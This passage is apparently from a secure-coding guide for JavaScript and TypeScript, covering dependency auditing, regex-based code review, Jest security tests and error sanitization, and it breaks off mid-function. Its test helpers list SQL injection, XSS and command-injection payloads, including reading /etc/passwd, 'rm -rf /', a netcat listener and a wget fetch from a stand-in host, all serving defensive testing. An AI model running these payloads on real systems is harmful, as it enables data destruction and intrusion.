# Secure Coding Practices

## Overview

Secure coding practices are essential for preventing vulnerabilities and building robust, secure applications. This document provides comprehensive guidelines for writing secure JavaScript and TypeScript code, covering secure dependency management, code review practices, security testing, error handling, and configuration management.

## Secure Dependency Management

### 1. Dependency Security

**Dependency Audit and Monitoring:**
```typescript
// package.json with security considerations
{
  "name": "secure-app",
  "version": "1.0.0",
  "dependencies": {
    "express": "^4.18.0",
    "helmet": "^7.0.0",
    "bcrypt": "^5.1.0",
    "jsonwebtoken": "^9.0.0",
    "validator": "^13.9.0"
  },
  "devDependencies": {
    "eslint": "^8.0.0",
    "eslint-plugin-security": "^1.7.1",
    "snyk": "^1.1000.0",
    "npm-audit-resolver": "^2.1.0"
  },
  "scripts": {
    "security:audit": "npm audit --audit-level=moderate",
    "security:fix": "npm audit fix",
    "security:snyk": "snyk test",
    "security:check": "npm run security:audit && npm run security:snyk"
  }
}

// Automated security scanning script
import { execSync } from 'child_process';
import fs from 'fs';

class SecurityAuditService {
  private readonly vulnerabilities: any[] = [];

  async runSecurityAudit(): Promise<void> {
    console.log('Running security audit...');

    try {
      // Run npm audit
      const auditResult = execSync('npm audit --json', { encoding: 'utf8' });
      const auditData = JSON.parse(auditResult);

      if (auditData.vulnerabilities) {
        this.processVulnerabilities(auditData.vulnerabilities);
      }

      // Run Snyk scan
      try {
        const snykResult = execSync('snyk test --json', { encoding: 'utf8' });
        const snykData = JSON.parse(snykResult);
        
        if (snykData.vulnerabilities) {
          this.processSnykVulnerabilities(snykData.vulnerabilities);
        }
      } catch (snykError) {
        console.warn('Snyk scan failed:', snykError.message);
      }

      // Generate security report
      this.generateSecurityReport();

    } catch (error) {
      console.error('Security audit failed:', error.message);
    }
  }

  private processVulnerabilities(vulnerabilities: any): void {
    Object.values(vulnerabilities).forEach((vuln: any) => {
      this.vulnerabilities.push({
        name: vuln.name,
        severity: vuln.severity,
        range: vuln.range,
        fixAvailable: vuln.fixAvailable,
        description: vuln.description
      });
    });
  }

  private processSnykVulnerabilities(vulnerabilities: any[]): void {
    vulnerabilities.forEach(vuln => {
      this.vulnerabilities.push({
        id: vuln.id,
        title: vuln.title,
        severity: vuln.severity,
        package: vuln.packageName,
        version: vuln.version,
        description: vuln.description,
        upgradePath: vuln.upgradePath
      });
    });
  }

  private generateSecurityReport(): void {
    const report = {
      timestamp: new Date().toISOString(),
      totalVulnerabilities: this.vulnerabilities.length,
      bySeverity: this.groupBySeverity(),
      recommendations: this.generateRecommendations()
    };

    fs.writeFileSync('security-audit-report.json', JSON.stringify(report, null, 2));
    console.log('Security audit complete. Report saved to security-audit-report.json');
  }

  private groupBySeverity(): Record<string, number> {
    return this.vulnerabilities.reduce((acc, vuln) => {
      acc[vuln.severity] = (acc[vuln.severity] || 0) + 1;
      return acc;
    }, {} as Record<string, number>);
  }

  private generateRecommendations(): string[] {
    const recommendations: string[] = [];

    this.vulnerabilities.forEach(vuln => {
      if (vuln.fixAvailable) {
        recommendations.push(`Update ${vuln.name} to fix available version`);
      } else {
        recommendations.push(`Review ${vuln.name} - no automatic fix available`);
      }
    });

    return [...new Set(recommendations)]; // Remove duplicates
  }
}

// Usage
const auditService = new SecurityAuditService();
auditService.runSecurityAudit();
```

**Secure Dependency Loading:**
```typescript
class SecureDependencyLoader {
  private readonly allowedPackages = new Set([
    'express',
    'helmet',
    'bcrypt',
    'jsonwebtoken',
    'validator'
  ]);

  private readonly packageVersions = new Map([
    ['express', '^4.18.0'],
    ['helmet', '^7.0.0'],
    ['bcrypt', '^5.1.0'],
    ['jsonwebtoken', '^9.0.0'],
    ['validator', '^13.9.0']
  ]);

  // Validate package before requiring
  requireSecure(packageName: string): any {
    // Check if package is allowed
    if (!this.allowedPackages.has(packageName)) {
      throw new Error(`Package ${packageName} is not in the allowlist`);
    }

    // Check package version
    const requiredVersion = this.packageVersions.get(packageName);
    const packageJson = this.getPackageJson(packageName);
    
    if (requiredVersion && !this.satisfiesVersion(packageJson.version, requiredVersion)) {
      throw new Error(`Package ${packageName} version ${packageJson.version} does not satisfy ${requiredVersion}`);
    }

    // Additional security checks
    this.performSecurityChecks(packageName);

    return require(packageName);
  }

  private getPackageJson(packageName: string): any {
    try {
      const packagePath = require.resolve(`${packageName}/package.json`);
      return require(packagePath);
    } catch (error) {
      throw new Error(`Could not load package.json for ${packageName}`);
    }
  }

  private satisfiesVersion(current: string, required: string): boolean {
    // Simple version check (in production, use semver library)
    const currentParts = current.split('.').map(Number);
    const requiredParts = required.replace('^', '').split('.').map(Number);
    
    for (let i = 0; i < 3; i++) {
      if (currentParts[i] > requiredParts[i]) return true;
      if (currentParts[i] < requiredParts[i]) return false;
    }
    
    return true;
  }

  private performSecurityChecks(packageName: string): void {
    // Check for known malicious packages
    const knownMalicious = ['event-stream', 'flatmap-stream'];
    if (knownMalicious.includes(packageName)) {
      throw new Error(`Package ${packageName} is known to be malicious`);
    }

    // Check package size (potential indicator of malicious code)
    const packagePath = require.resolve(packageName);
    const stats = require('fs').statSync(packagePath);
    
    if (stats.size > 1024 * 1024) { // 1MB threshold
      console.warn(`Package ${packageName} is unusually large (${stats.size} bytes)`);
    }
  }
}

// Usage
const loader = new SecureDependencyLoader();
const express = loader.requireSecure('express');
```

### 2. Supply Chain Security

**Package Integrity Verification:**
```typescript
import crypto from 'crypto';
import fs from 'fs';

class PackageIntegrityChecker {
  private readonly packageChecksums = new Map<string, string>();

  constructor() {
    this.loadKnownChecksums();
  }

  private loadKnownChecksums(): void {
    try {
      const checksums = JSON.parse(fs.readFileSync('package-checksums.json', 'utf8'));
      Object.entries(checksums).forEach(([pkg, checksum]) => {
        this.packageChecksums.set(pkg, checksum as string);
      });
    } catch (error) {
      console.warn('Could not load package checksums:', error.message);
    }
  }

  // Verify package integrity
  verifyPackage(packagePath: string): boolean {
    const checksum = this.calculateChecksum(packagePath);
    const knownChecksum = this.packageChecksums.get(packagePath);

    if (!knownChecksum) {
      console.warn(`No known checksum for ${packagePath}`);
      return false;
    }

    if (checksum !== knownChecksum) {
      console.error(`Checksum mismatch for ${packagePath}`);
      console.error(`Expected: ${knownChecksum}`);
      console.error(`Actual: ${checksum}`);
      return false;
    }

    return true;
  }

  private calculateChecksum(filePath: string): string {
    const content = fs.readFileSync(filePath);
    return crypto.createHash('sha256').update(content).digest('hex');
  }

  // Generate checksums for current packages
  generateChecksums(): void {
    const packages = this.findPackages();
    const checksums: Record<string, string> = {};

    packages.forEach(pkg => {
      checksums[pkg] = this.calculateChecksum(pkg);
    });

    fs.writeFileSync('package-checksums.json', JSON.stringify(checksums, null, 2));
    console.log('Package checksums generated');
  }

  private findPackages(): string[] {
    const nodeModulesPath = './node_modules';
    const packages: string[] = [];

    if (fs.existsSync(nodeModulesPath)) {
      const modules = fs.readdirSync(nodeModulesPath);
      
      modules.forEach(module => {
        const modulePath = `${nodeModulesPath}/${module}`;
        const packageJsonPath = `${modulePath}/package.json`;
        
        if (fs.existsSync(packageJsonPath)) {
          packages.push(packageJsonPath);
        }
      });
    }

    return packages;
  }
}
```

## Code Review Security Checklist

### 1. Security Review Process

**Automated Security Review:**
```typescript
class SecurityCodeReviewer {
  private readonly securityPatterns = [
    // SQL injection patterns
    { pattern: /query\s*\(\s*['"`][^'"`]*\$\{[^}]+\}/, severity: 'high', description: 'Potential SQL injection' },
    { pattern: /SELECT.*\+.*\+.*FROM/, severity: 'high', description: 'String concatenation in SQL' },
    
    // XSS patterns
    { pattern: /innerHTML\s*=/, severity: 'high', description: 'Potential XSS via innerHTML' },
    { pattern: /document\.write\s*\(/, severity: 'high', description: 'Potential XSS via document.write' },
    { pattern: /eval\s*\(/, severity: 'high', description: 'Use of eval() function' },
    
    // Command injection patterns
    { pattern: /exec\s*\(\s*.*\+.*\)/, severity: 'high', description: 'Command injection via string concatenation' },
    { pattern: /spawn\s*\(\s*.*\+.*\)/, severity: 'high', description: 'Command injection via spawn' },
    
    // Information disclosure patterns
    { pattern: /console\.log\s*\(/, severity: 'medium', description: 'Debug information in production' },
    { pattern: /password.*=.*['"`][^'"`]+['"`]/, severity: 'high', description: 'Hardcoded password' },
    { pattern: /secret.*=.*['"`][^'"`]+['"`]/, severity: 'high', description: 'Hardcoded secret' },
    
    // Insecure cryptographic patterns
    { pattern: /crypto\.createHash\s*\(\s*['"`]md5['"`]/, severity: 'medium', description: 'Weak hashing algorithm (MD5)' },
    { pattern: /crypto\.createHash\s*\(\s*['"`]sha1['"`]/, severity: 'medium', description: 'Weak hashing algorithm (SHA1)' },
    { pattern: /crypto\.createCipher\s*\(\s*['"`]des['"`]/, severity: 'high', description: 'Weak encryption algorithm (DES)' }
  ];

  // Review code for security issues
  reviewCode(code: string, filename: string): SecurityReviewResult {
    const issues: SecurityIssue[] = [];

    this.securityPatterns.forEach(pattern => {
      let match;
      const regex = new RegExp(pattern.pattern, 'g');
      
      while ((match = regex.exec(code)) !== null) {
        issues.push({
          line: this.getLineNumber(code, match.index),
          column: match.index - code.lastIndexOf('\n', match.index - 1),
          severity: pattern.severity,
          description: pattern.description,
          code: match[0],
          filename
        });
      }
    });

    return {
      filename,
      totalIssues: issues.length,
      bySeverity: this.groupBySeverity(issues),
      issues
    };
  }

  private getLineNumber(code: string, index: number): number {
    return code.substring(0, index).split('\n').length;
  }

  private groupBySeverity(issues: SecurityIssue[]): Record<string, number> {
    return issues.reduce((acc, issue) => {
      acc[issue.severity] = (acc[issue.severity] || 0) + 1;
      return acc;
    }, {} as Record<string, number>);
  }

  // Review entire project
  async reviewProject(projectPath: string): Promise<ProjectReviewResult> {
    const files = this.findSourceFiles(projectPath);
    const results: SecurityReviewResult[] = [];

    for (const file of files) {
      try {
        const code = fs.readFileSync(file, 'utf8');
        const result = this.reviewCode(code, file);
        results.push(result);
      } catch (error) {
        console.warn(`Could not review ${file}:`, error.message);
      }
    }

    return {
      totalFiles: files.length,
      totalIssues: results.reduce((sum, result) => sum + result.totalIssues, 0),
      results,
      summary: this.generateSummary(results)
    };
  }

  private findSourceFiles(projectPath: string): string[] {
    const files: string[] = [];
    const extensions = ['.js', '.ts', '.jsx', '.tsx'];

    function walkDir(dir: string) {
      const items = fs.readdirSync(dir);
      
      items.forEach(item => {
        const fullPath = `${dir}/${item}`;
        const stat = fs.statSync(fullPath);
        
        if (stat.isDirectory() && !item.startsWith('.') && item !== 'node_modules') {
          walkDir(fullPath);
        } else if (stat.isFile() && extensions.some(ext => fullPath.endsWith(ext))) {
          files.push(fullPath);
        }
      });
    }

    walkDir(projectPath);
    return files;
  }

  private generateSummary(results: SecurityReviewResult[]): SecuritySummary {
    const totalIssues = results.reduce((sum, result) => sum + result.totalIssues, 0);
    const bySeverity = { high: 0, medium: 0, low: 0 };
    
    results.forEach(result => {
      Object.entries(result.bySeverity).forEach(([severity, count]) => {
        bySeverity[severity as keyof typeof bySeverity] += count;
      });
    });

    return {
      totalIssues,
      bySeverity,
      filesWithIssues: results.filter(r => r.totalIssues > 0).length,
      recommendations: this.generateRecommendations(results)
    };
  }

  private generateRecommendations(results: SecurityReviewResult[]): string[] {
    const recommendations: string[] = [];
    const issues = results.flatMap(r => r.issues);

    const highSeverityIssues = issues.filter(i => i.severity === 'high');
    if (highSeverityIssues.length > 0) {
      recommendations.push('Address all high-severity security issues immediately');
    }

    const xssIssues = issues.filter(i => i.description.includes('XSS'));
    if (xssIssues.length > 0) {
      recommendations.push('Implement proper input sanitization and output encoding');
    }

    const sqlIssues = issues.filter(i => i.description.includes('SQL'));
    if (sqlIssues.length > 0) {
      recommendations.push('Use parameterized queries to prevent SQL injection');
    }

    return recommendations;
  }
}

interface SecurityIssue {
  line: number;
  column: number;
  severity: 'high' | 'medium' | 'low';
  description: string;
  code: string;
  filename: string;
}

interface SecurityReviewResult {
  filename: string;
  totalIssues: number;
  bySeverity: Record<string, number>;
  issues: SecurityIssue[];
}

interface ProjectReviewResult {
  totalFiles: number;
  totalIssues: number;
  results: SecurityReviewResult[];
  summary: SecuritySummary;
}

interface SecuritySummary {
  totalIssues: number;
  bySeverity: Record<string, number>;
  filesWithIssues: number;
  recommendations: string[];
}
```

### 2. Manual Security Review Checklist

**Security Review Checklist:**
```typescript
class SecurityReviewChecklist {
  private readonly checklist = [
    {
      category: 'Input Validation',
      items: [
        'All user inputs are validated on the server-side',
        'Input length limits are enforced',
        'Input format validation is implemented',
        'Special characters are properly escaped',
        'File uploads are validated for type and size'
      ]
    },
    {
      category: 'Authentication',
      items: [
        'Passwords are hashed with bcrypt or similar',
        'Session management is secure',
        'Multi-factor authentication is implemented for sensitive operations',
        'Password reset functionality is secure',
        'Account lockout is implemented for failed login attempts'
      ]
    },
    {
      category: 'Authorization',
      items: [
        'Access controls are implemented for all resources',
        'Principle of least privilege is followed',
        'Role-based access control is implemented',
        'Sensitive operations require additional verification',
        'API endpoints have proper authentication checks'
      ]
    },
    {
      category: 'Data Protection',
      items: [
        'Sensitive data is encrypted at rest',
        'HTTPS is enforced for all communications',
        'PII is properly anonymized when not needed',
        'Data retention policies are implemented',
        'Secure data deletion is implemented'
      ]
    },
    {
      category: 'Error Handling',
      items: [
        'Generic error messages are shown to users',
        'Detailed errors are logged securely',
        'Stack traces are not exposed to users',
        'Error handling doesn\'t leak sensitive information',
        'Graceful degradation is implemented'
      ]
    },
    {
      category: 'Dependencies',
      items: [
        'Dependencies are regularly updated',
        'Known vulnerabilities are patched',
        'Only necessary dependencies are included',
        'Dependencies are from trusted sources',
        'Supply chain security is considered'
      ]
    },
    {
      category: 'Configuration',
      items: [
        'Default credentials are changed',
        'Debug mode is disabled in production',
        'Security headers are configured',
        'CORS is properly configured',
        'Environment variables are used for secrets'
      ]
    }
  ];

  // Generate review checklist for a specific feature
  generateFeatureChecklist(feature: string): FeatureChecklist {
    return {
      feature,
      categories: this.checklist.map(category => ({
        name: category.category,
        items: category.items.map(item => ({
          description: item,
          status: 'pending' as ChecklistStatus,
          notes: ''
        }))
      })),
      createdAt: new Date().toISOString(),
      reviewedBy: '',
      completedAt: null
    };
  }

  // Validate checklist completion
  validateChecklist(checklist: FeatureChecklist): ChecklistValidation {
    const totalItems = checklist.categories.reduce((sum, category) => 
      sum + category.items.length, 0
    );
    
    const completedItems = checklist.categories.reduce((sum, category) => 
      sum + category.items.filter(item => item.status === 'completed').length, 0
    );

    const failedItems = checklist.categories.reduce((sum, category) => 
      sum + category.items.filter(item => item.status === 'failed').length, 0
    );

    return {
      totalItems,
      completedItems,
      failedItems,
      pendingItems: totalItems - completedItems - failedItems,
      completionPercentage: Math.round((completedItems / totalItems) * 100),
      status: failedItems > 0 ? 'failed' : (completedItems === totalItems ? 'completed' : 'in_progress')
    };
  }

  // Export checklist as JSON
  exportChecklist(checklist: FeatureChecklist): string {
    return JSON.stringify(checklist, null, 2);
  }

  // Import checklist from JSON
  importChecklist(json: string): FeatureChecklist {
    return JSON.parse(json);
  }
}

type ChecklistStatus = 'pending' | 'completed' | 'failed' | 'skipped';

interface ChecklistItem {
  description: string;
  status: ChecklistStatus;
  notes: string;
}

interface ChecklistCategory {
  name: string;
  items: ChecklistItem[];
}

interface FeatureChecklist {
  feature: string;
  categories: ChecklistCategory[];
  createdAt: string;
  reviewedBy: string;
  completedAt: string | null;
}

interface ChecklistValidation {
  totalItems: number;
  completedItems: number;
  failedItems: number;
  pendingItems: number;
  completionPercentage: number;
  status: 'completed' | 'in_progress' | 'failed';
}
```

## Security Testing

### 1. Automated Security Testing

**Security Test Suite:**
```typescript
import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import request from 'supertest';
import app from '../app';

describe('Security Tests', () => {
  let server: any;

  beforeAll(async () => {
    server = app.listen(0); // Use random port for testing
  });

  afterAll(async () => {
    await server.close();
  });

  describe('Input Validation', () => {
    it('should reject SQL injection attempts', async () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "admin'; --",
        "1'; DELETE FROM users WHERE 1=1; --"
      ];

      for (const input of maliciousInputs) {
        const response = await request(app)
          .post('/api/auth/login')
          .send({ email: input, password: 'password' });

        expect(response.status).toBe(400);
        expect(response.body.error).toBeDefined();
      }
    });

    it('should reject XSS attempts', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("xss")',
        '<svg onload="alert(1)">'
      ];

      for (const input of maliciousInputs) {
        const response = await request(app)
          .post('/api/comments')
          .send({ content: input })
          .set('Authorization', 'Bearer valid-token');

        expect(response.status).toBe(400);
        expect(response.body.error).toBeDefined();
      }
    });

    it('should validate input length', async () => {
      const longInput = 'a'.repeat(10000);

      const response = await request(app)
        .post('/api/users')
        .send({ name: longInput })
        .set('Authorization', 'Bearer valid-token');

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('too long');
    });

    it('should validate email format', async () => {
      const invalidEmails = [
        'invalid-email',
        '@domain.com',
        'user@',
        'user@domain',
        'user name@domain.com'
      ];

      for (const email of invalidEmails) {
        const response = await request(app)
          .post('/api/users')
          .send({ email, name: 'Test User' })
          .set('Authorization', 'Bearer valid-token');

        expect(response.status).toBe(400);
        expect(response.body.error).toContain('email');
      }
    });
  });

  describe('Authentication Security', () => {
    it('should require authentication for protected endpoints', async () => {
      const response = await request(app)
        .get('/api/users/profile');

      expect(response.status).toBe(401);
      expect(response.body.error).toContain('authentication');
    });

    it('should reject expired tokens', async () => {
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.sample-expired-token';

      const response = await request(app)
        .get('/api/users/profile')
        .set('Authorization', `Bearer ${expiredToken}`);

      expect(response.status).toBe(403);
      expect(response.body.error).toContain('expired');
    });

    it('should implement rate limiting', async () => {
      // Make multiple requests rapidly
      const requests = Array(10).fill(null).map(() => 
        request(app).post('/api/auth/login').send({ email: 'test@test.com', password: 'wrong' })
      );

      const responses = await Promise.all(requests);
      
      // Some requests should be rate limited
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('Authorization Security', () => {
    it('should enforce role-based access', async () => {
      // Login as regular user
      const userLogin = await request(app)
        .post('/api/auth/login')
        .send({ email: 'user@test.com', password: 'password' });

      const userToken = userLogin.body.tokens.accessToken;

      // Try to access admin endpoint
      const response = await request(app)
        .get('/api/admin/users')
        .set('Authorization', `Bearer ${userToken}`);

      expect(response.status).toBe(403);
      expect(response.body.error).toContain('permission');
    });

    it('should prevent IDOR (Insecure Direct Object Reference)', async () => {
      // Login as user A
      const userALogin = await request(app)
        .post('/api/auth/login')
        .send({ email: 'userA@test.com', password: 'password' });

      const userAToken = userALogin.body.tokens.accessToken;

      // Try to access user B's data
      const response = await request(app)
        .get('/api/users/userB-id')
        .set('Authorization', `Bearer ${userAToken}`);

      expect(response.status).toBe(403);
      expect(response.body.error).toContain('access');
    });
  });

  describe('Data Protection', () => {
    it('should not expose sensitive data in responses', async () => {
      const response = await request(app)
        .get('/api/users/profile')
        .set('Authorization', 'Bearer valid-token');

      expect(response.status).toBe(200);
      expect(response.body.password).toBeUndefined();
      expect(response.body.ssn).toBeUndefined();
      expect(response.body.creditCard).toBeUndefined();
    });

    it('should enforce HTTPS in production', async () => {
      // This test would need to be run in a production-like environment
      // For now, we test that the middleware is configured
      expect(app.get('trust proxy')).toBeDefined();
      
      // Check if security headers are present
      const response = await request(app).get('/');
      expect(response.headers['strict-transport-security']).toBeDefined();
    });
  });

  describe('Error Handling', () => {
    it('should not expose stack traces', async () => {
      const response = await request(app)
        .get('/api/nonexistent-endpoint');

      expect(response.status).toBe(404);
      expect(response.body.stack).toBeUndefined();
      expect(response.body.message).toBeDefined();
    });

    it('should handle database errors gracefully', async () => {
      // This would require mocking database failures
      // Implementation depends on your database setup
      expect(true).toBe(true); // Placeholder
    });
  });
});
```

### 2. Security Testing Utilities

**Security Test Helpers:**
```typescript
class SecurityTestHelpers {
  // Generate malicious payloads for testing
  static getSQLInjectionPayloads(): string[] {
    return [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "admin'; --",
      "1'; DELETE FROM users WHERE 1=1; --",
      "' UNION SELECT * FROM users --",
      "'; INSERT INTO users VALUES ('hacker', 'pass'); --"
    ];
  }

  static getXSSPayloads(): string[] {
    return [
      '<script>alert("xss")</script>',
      '<img src="x" onerror="alert(1)">',
      'javascript:alert("xss")',
      '<svg onload="alert(1)">',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<body onload="alert(1)">'
    ];
  }

  static getCommandInjectionPayloads(): string[] {
    return [
      '; cat /etc/passwd',
      '| whoami',
      '&& ls -la',
      '; rm -rf /',
      '| nc -l 4444',
      '&& wget malicious.com/script.sh'
    ];
  }

  // Test input validation
  static async testInputValidation(
    requestFn: (input: string) => Promise<any>,
    payloads: string[],
    expectedStatus: number = 400
  ): Promise<TestResult[]> {
    const results: TestResult[] = [];

    for (const payload of payloads) {
      try {
        const response = await requestFn(payload);
        results.push({
          payload,
          status: response.status,
          success: response.status === expectedStatus,
          body: response.body
        });
      } catch (error) {
        results.push({
          payload,
          status: 0,
          success: false,
          error: error.message
        });
      }
    }

    return results;
  }

  // Test authentication bypass
  static async testAuthenticationBypass(
    endpoints: string[],
    methods: string[] = ['GET', 'POST', 'PUT', 'DELETE']
  ): Promise<BypassTestResult[]> {
    const results: BypassTestResult[] = [];

    for (const endpoint of endpoints) {
      for (const method of methods) {
        try {
          let response;
          
          switch (method.toUpperCase()) {
            case 'GET':
              response = await request(app).get(endpoint);
              break;
            case 'POST':
              response = await request(app).post(endpoint).send({});
              break;
            case 'PUT':
              response = await request(app).put(endpoint).send({});
              break;
            case 'DELETE':
              response = await request(app).delete(endpoint);
              break;
          }

          results.push({
            endpoint,
            method,
            status: response.status,
            bypassed: response.status !== 401 && response.status !== 403,
            body: response.body
          });

        } catch (error) {
          results.push({
            endpoint,
            method,
            status: 0,
            bypassed: false,
            error: error.message
          });
        }
      }
    }

    return results;
  }

  // Test authorization bypass
  static async testAuthorizationBypass(
    userToken: string,
    adminEndpoints: string[]
  ): Promise<AuthorizationTestResult[]> {
    const results: AuthorizationTestResult[] = [];

    for (const endpoint of adminEndpoints) {
      try {
        const response = await request(app)
          .get(endpoint)
          .set('Authorization', `Bearer ${userToken}`);

        results.push({
          endpoint,
          status: response.status,
          bypassed: response.status === 200,
          body: response.body
        });

      } catch (error) {
        results.push({
          endpoint,
          status: 0,
          bypassed: false,
          error: error.message
        });
      }
    }

    return results;
  }

  // Generate test report
  static generateTestReport(results: TestResult[]): SecurityTestReport {
    const totalTests = results.length;
    const passedTests = results.filter(r => r.success).length;
    const failedTests = totalTests - passedTests;

    return {
      totalTests,
      passedTests,
      failedTests,
      passRate: Math.round((passedTests / totalTests) * 100),
      results,
      summary: {
        vulnerabilities: results.filter(r => !r.success),
        recommendations: this.generateRecommendations(results)
      }
    };
  }

  private static generateRecommendations(results: TestResult[]): string[] {
    const recommendations: string[] = [];
    const failedResults = results.filter(r => !r.success);

    if (failedResults.some(r => r.body && r.body.stack)) {
      recommendations.push('Fix error handling to prevent stack trace exposure');
    }

    if (failedResults.some(r => r.body && r.body.password)) {
      recommendations.push('Remove sensitive data from API responses');
    }

    if (failedResults.length > results.length * 0.5) {
      recommendations.push('Review and strengthen input validation');
    }

    return recommendations;
  }
}

interface TestResult {
  payload: string;
  status: number;
  success: boolean;
  body?: any;
  error?: string;
}

interface BypassTestResult {
  endpoint: string;
  method: string;
  status: number;
  bypassed: boolean;
  body?: any;
  error?: string;
}

interface AuthorizationTestResult {
  endpoint: string;
  status: number;
  bypassed: boolean;
  body?: any;
  error?: string;
}

interface SecurityTestReport {
  totalTests: number;
  passedTests: number;
  failedTests: number;
  passRate: number;
  results: TestResult[];
  summary: {
    vulnerabilities: TestResult[];
    recommendations: string[];
  };
}
```

## Error Handling and Information Disclosure

### 1. Secure Error Handling

**Error Handling Service:**
```typescript
class SecureErrorService {
  private readonly sensitivePatterns = [
    /password/i,
    /secret/i,
    /token/i,
    /key/i,
    /credential/i,
    /ssn/i,
    /credit.?card/i,
    /api.?key/i
  ];

  // Handle errors securely
  handleSecureError(error: Error, context?: ErrorContext): SecureError {
    const secureError = this.createSecureError(error, context);
    
    // Log detailed error for debugging
    this.logError(error, context);
    
    // Return sanitized error to client
    return secureError;
  }

  private createSecureError(error: Error, context?: ErrorContext): SecureError {
    const errorId = this.generateErrorId();
    
    // Determine error type and create appropriate message
    const secureMessage = this.getSecureMessage(error, context);
    
    return {
      errorId,
      message: secureMessage,
      timestamp: new Date().toISOString(),
      context: context ? this.sanitizeContext(context) : undefined
    };
  }

  private getSecureMessage(error: Error, context?: ErrorContext): string {
    // Map specific errors to generic messages
    const errorMappings: Record<string, string> = {
      'ValidationError': 'Invalid input provided',
      'CastError': 'Invalid data format',
      'MongoError': 'Database operation failed',
      'JsonWebTokenError': 'Authentication failed',
      'TokenExpiredError': 'Session expired',
      'MulterError': 'File upload failed',
      'SyntaxError': 'Invalid request format'
    };

    const errorType = error.constructor.name;
    const mappedMessage = errorMappings[errorType];
    
    if (mappedMessage) {
      return mappedMessage;
    }

    // For unknown errors, provide generic message
    return 'An unexpected error occurred';
  }

  private sanitizeContext(context?: ErrorContext): ErrorContext | undefined {
    if (!context) return undefined;

    const sanitized = { ...context };
    
    // Remove sensitive information from context
    Object.keys(sanitized).forEach(key => {
      const value = sanitized[key];
      
      if (typeof value === 'string' && this.isSensitiveData(value)) {
        sanitized[key] = '[REDACTED]';
      } else if (typeof value === 'object' && value !== null) {
        sanitized[key] = this.sanitizeObject(value);
      }
    });

    return sanitized;
  }

  private sanitizeObject(obj: any): any {
    const sanitized = { ...obj };
    
    Object.keys(sanitized).forEach(key => {
      const value = sanitized[key];
      
      if (typeof value === 'string' && this.isSensitiveData(value)) {
        sanitized[key] = '[REDACTED]';
      } else if (typeof value === 'object' && value !== null && !Array.isArray(value)) {
        sanitized[key] = this.sanitizeObject(value);
      }
    });

    return sanitized;
  }

  private isSensitiveData(value: string): boolean {
    return this.sensitivePatterns.some(pattern => pattern.test(value));
  }

  private generateErrorId(): string {
    return `ERR_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
  }

  private logError(error: Error, context?: ErrorContext): void {
    const logEntry = {
      timestamp: new Date().toISOString(),
      errorId: this.generateErrorId(),
      error: {
        name: error.name,
        message: error.message,
        stack: error.stack,
        cause: error.cause
      },
      context,
      userAgent: context?.userAgent,
      ip: context?.ip
    };

    // Log to secure logging system
    console.error(JSON.stringify(logEntry, null, 2));
    
    // In production, send to centralized logging service
    // this.sendToLoggingService(logEntry);
  }

  // Express error handling middleware
  static createMiddleware() {
    const errorService = new SecureErrorService();
    
    return (error: Error, req: Request, res: Response, next: NextFunction) => {
      const context: ErrorContext = {
        url: req.url,
        method: req.method,
        userAgent: req.get('User-Agent'),
        ip: req.ip,
        userId: (req as any).user?.id
      };

      const secureError = errorService.handleSecureError(error, context);

      res.status(this.getStatusCode(error)).json({
        success: false,
        error: secureError
      });
    };
  }

  private static getStatusCode(error: Error): number {
    const statusMappings: Record<string, number> = {
      'ValidationError': 400,
      'CastError': 400,
      'MongoError': 500,
      'JsonWebTokenError': 401,
      'TokenExpiredError': 401,
      'MulterError': 400,
      'SyntaxError': 400
    };

    return statusMappings[error.constructor.name] || 500;
  }
}

interface ErrorContext {
  url?: string;
  method?: string;
  userAgent?: string;
  ip?: string;
  userId?: string;
  [key: string]: any;
}

interface SecureError {
  errorId: string;
  message: string;
  timestamp: string;
  context?: ErrorContext;
}
```

### 2. Information Disclosure Prevention

**Data Sanitization Service:**
```typescript
class DataSanitizationService {
  private readonly sensitiveFields = new Set([
    'password',
    'secret',
    'token',
    'key',
    'credential',
    'ssn',
    'creditCard',
    'apiKey',
    'privateKey',
    'sessionToken'
  ]);

  // Sanitize data for logging
  sanitizeForLogging(data: any): any {
    if (typeof data === 'string') {
      return this.sanitizeString(data);
    }
    
    if (typeof data === 'object' && data !== null) {
      if (Array.isArray(data)) {
        return data.map(item => this.sanitizeForLogging(item));
      }
      
      const sanitized = { ...data };
      Object.keys(sanitized).forEach(key => {
        if (this.sensitiveFields.has(key.toLowerCase())) {
          sanitized[key] = '[REDACTED]';
        } else {
          sanitized[key] = this.sanitizeForLogging(sanitized[key]);
        }
      });
      
      return sanitized;
    }
    
    return data;
  }

  // Sanitize response data
  sanitizeResponseData(data: any): any {
    if (typeof data === 'string') {
      return data;
    }
    
    if (typeof data === 'object' && data !== null) {
      if (Array.isArray(data)) {
        return data.map(item => this.sanitizeResponseData(item));
      }
      
      const sanitized = { ...data };
      Object.keys(sanitized).forEach(key => {
        if (this.sensitiveFields.has(key.toLowerCase())) {
          delete sanitized[key];
        } else {
          sanitized[key] = this.sanitizeResponseData(sanitized[key]);
        }
      });
      
      return sanitized;
    }
    
    return data;
  }

  // Sanitize error messages
  sanitizeErrorMessage(message: string): string {
    // Remove sensitive information from error messages
    let sanitized = message;
    
    // Remove email addresses
    sanitized = sanitized.replace(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g, '[EMAIL_REDACTED]');
    
    // Remove IP addresses
    sanitized = sanitized.replace(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g, '[IP_REDACTED]');
    
    // Remove file paths
    sanitized = sanitized.replace(/\/[^\s]+/g, match => {
      if (match.includes('.') && !match.includes('http')) {
        return '[FILE_PATH_REDACTED]';
      }
      return match;
    });
    
    // Remove database connection strings
    sanitized = sanitized.replace(/mongodb:\/\/[^\s]+/g, '[DB_CONNECTION_REDACTED]');
